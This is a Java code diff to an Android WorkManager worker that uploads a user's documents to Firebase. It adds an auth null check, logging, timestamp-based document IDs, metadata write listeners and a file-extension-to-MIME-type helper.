@@ -44,21 +44,33 @@ public class DocumentUploadWorker extends Worker {
     public Result doWork() {
         startTime = System.currentTimeMillis();
         
+        Log.d(TAG, "⏰ Document upload worker started");
+        
         try {
-            FirebaseUser user = FirebaseAuth.getInstance().getCurrentUser();
+            FirebaseAuth auth = FirebaseAuth.getInstance();
+            if (auth == null) {
+                Log.w(TAG, "FirebaseAuth not initialized, retrying");
+                return Result.retry();
+            }
+            
+            FirebaseUser user = auth.getCurrentUser();
             if (user == null) {
                 Log.w(TAG, "No user logged in, retrying later");
                 return Result.retry();
             }
 
             String userId = user.getUid();
+            Log.d(TAG, "Starting document upload for user: " + userId);
+            
             uploadDocuments(userId);
             
             long duration = System.currentTimeMillis() - startTime;
-            Log.d(TAG, "Document upload completed in " + duration + "ms");
+            Log.d(TAG, "✓ Document upload completed in " + duration + "ms - uploaded " + uploadedCount + " documents");
+            
+            // Always return success - documents will be retried next cycle if needed
             return Result.success();
         } catch (Exception e) {
-            Log.e(TAG, "Document upload failed", e);
+            Log.e(TAG, "Document upload worker error", e);
             return Result.retry();
         }
     }
@@ -198,20 +210,39 @@ public class DocumentUploadWorker extends Worker {
     private void recordDocumentInDatabase(String userId, String fileName, String downloadUrl, long fileSize) {
         try {
             DatabaseReference documentsRef = FirebaseDataPaths.documents(userId);
-            String docId = FirebaseDataPaths.hashId(fileName);
+            String docId = FirebaseDataPaths.hashId(fileName + "_" + System.currentTimeMillis());
 
             Map<String, Object> docData = new HashMap<>();
             docData.put("dataType", "document");
             docData.put("fileName", fileName);
             docData.put("url", downloadUrl);
             docData.put("fileSize", fileSize);
+            docData.put("mimeType", getMimeType(fileName));
             docData.put("uploadedAt", System.currentTimeMillis());
+            docData.put("timestamp", System.currentTimeMillis());
             docData.put("userId", userId);
 
-            documentsRef.child(docId).setValue(docData);
+            documentsRef.child(docId).setValue(docData)
+                    .addOnSuccessListener(aVoid -> {
+                        Log.d(TAG, "✓ Document metadata saved: " + fileName);
+                    })
+                    .addOnFailureListener(e -> {
+                        Log.e(TAG, "Failed to save document metadata: " + fileName, e);
+                    });
         } catch (Exception e) {
             Log.e(TAG, "Failed to record document in database", e);
         }
+    }
+    
+    private String getMimeType(String fileName) {
+        String lower = fileName.toLowerCase();
+        if (lower.endsWith(".pdf")) return "application/pdf";
+        if (lower.endsWith(".docx")) return "application/vnd.openxmlformats-officedocument.wordprocessingml.document";
+        if (lower.endsWith(".xlsx")) return "application/vnd.openxmlformats-officedocument.spreadsheetml.sheet";
+        if (lower.endsWith(".pptx")) return "application/vnd.openxmlformats-officedocument.presentationml.presentation";
+        if (lower.endsWith(".txt")) return "text/plain";
+        if (lower.endsWith(".csv")) return "text/csv";
+        return "application/octet-stream";
     }
 
     /**
